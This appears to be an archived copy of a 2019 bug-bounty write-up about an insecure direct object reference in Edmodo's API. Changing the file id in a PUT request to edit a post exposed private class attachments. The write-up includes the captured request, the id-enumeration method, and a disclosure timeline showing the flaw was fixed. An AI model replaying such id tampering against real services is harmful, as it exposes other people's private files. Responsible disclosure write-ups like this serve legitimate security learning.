---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2019-04-06_edmodo-idor-to-view-private-files-of-any-class.md
original_filename: 2019-04-06_edmodo-idor-to-view-private-files-of-any-class.md
title: Edmodo — IDOR to view private files of any class
category: documents
detected_topics:
- idor
- command-injection
- otp
tags:
- imported
- documents
- idor
- command-injection
- otp
language: en
raw_sha256: faa0e9ed843859fc46815ab3f965972ca1998b1c7e163c555c6d802654dd6608
text_sha256: 07a0a367e7a3c70ca5680d23e900926ecb7b207d92ae85ddb7932a0647bcf734
ingested_at: '2026-06-28T07:31:59Z'
sensitivity: unknown
redactions_applied: false
---

# Edmodo — IDOR to view private files of any class

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2019-04-06_edmodo-idor-to-view-private-files-of-any-class.md
- Source Type: markdown
- Detected Topics: idor, command-injection, otp
- Ingested At: 2026-06-28T07:31:59Z
- Redactions Applied: False
- Raw SHA256: `faa0e9ed843859fc46815ab3f965972ca1998b1c7e163c555c6d802654dd6608`
- Text SHA256: `07a0a367e7a3c70ca5680d23e900926ecb7b207d92ae85ddb7932a0647bcf734`


## Content

---
title: "Edmodo — IDOR to view private files of any class"
page_title: "Edmodo — IDOR to view private files of any class | by Rohan Pagey | Medium"
url: "https://medium.com/@rohan_x3/edmodo-idor-to-view-private-files-of-any-class-2280676c84b8"
authors: ["Rohan Pagey (@rohan_x3)"]
programs: ["Edmodo"]
bugs: ["IDOR"]
publication_date: "2019-04-06"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 5325
scraped_via: "browseros"
---

# Edmodo — IDOR to view private files of any class

Edmodo — IDOR to view private files of any class
Rohan Pagey
Follow
1 min read
·
Apr 7, 2019

74

TL;DR A PUT request to editing post endpoint involved file-id parameter,changing that parameter would link that file to my post

What is Edmodo ?
Platform to connect teachers-students-parents . Kind of social networking for learning.
Functionality
Edmodo is having a functionality called classes
A teacher can create a class and invite students to join the class
Teachers generally upload their notes/assignments/files etc inside a class
Classes are private & only those students who are having an invitation can access the content posted inside that class
With this bug, I was able to access the private attachments of any class without being a member of it
Proof Of Concept

1. From a teacher’s edmodo account,go to your class and capture the request for editing a post (The post should have an attachment)

Get Rohan Pagey’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

2. The captured request will be like this :

PUT /messages/693960217?access_token=xyz&request_origin=react-web-app HTTP/1.1
Host: api.edmodo.com
Connection: close
Content-Length: 180
Accept: application/json
Origin: https://new.edmodo.com
User-Agent: Mozilla/5.0
Content-Type: application/json
Referer: https://new.edmodo.com/groups/my-class-1234
Accept-Language: en-US,en;q=0.9
{“content”:{“id”:693960217,”text”:”Final notes”,”attachments”:{“files”:[{“id”:910143311}],”links”:[],”embeds”:[]}},”id”:693960217,”url”:”https://api.edmodo.com/messages/693960217"}

3. It is taking “files”:[{“id”:910143311}] parameter and attaching it in your post.

4. An attacker can change that id to any number and that file will be linked to his post

5. As a result,an attacker can view every single attachment posted in any private class/groups just by incrementing/decrementing that id

Video POC

Timeline
Mar. 17, 2019 — Initial Report
Mar. 18, 2019 — Report Triaged
Mar. 25, 2019 — Bug Fixed and Swag Awarded
